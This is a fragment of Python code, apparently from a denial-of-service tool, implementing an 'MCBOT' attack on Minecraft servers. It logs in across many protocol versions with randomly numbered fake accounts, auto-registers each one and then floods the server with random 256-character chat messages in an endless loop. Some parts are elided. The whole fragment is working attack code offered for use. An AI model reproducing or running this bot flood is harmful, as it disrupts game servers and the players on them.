...
class YourClass:
    def MCBOT(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            # Assuming ProxyTools.Random.rand_ipv4() generates a random IPv4 address
            ip_address = ProxyTools.Random.rand_ipv4()

            for protocol_version in range(700, 766):
                ...
                # Generate a random number to replace letters in the username
                random_numbers = ''.join(str(random.randint(0, 9)) for _ in range(5))
                username = f"PixelSmash_{random_numbers}"

                password = b64encode(username.encode()).decode()[:8].title()
                Tools.send(s, Minecraft.login(protocol_version, username))
                
                sleep(1.5)

                Tools.send(s, Minecraft.chat(protocol_version, "/register %s %s" % (password, password)))
                Tools.send(s, Minecraft.chat(protocol_version, "/login %s" % password))

                while Tools.send(s, Minecraft.chat(protocol_version, str(ProxyTools.Random.rand_str(256)))):
                    sleep(1.1)
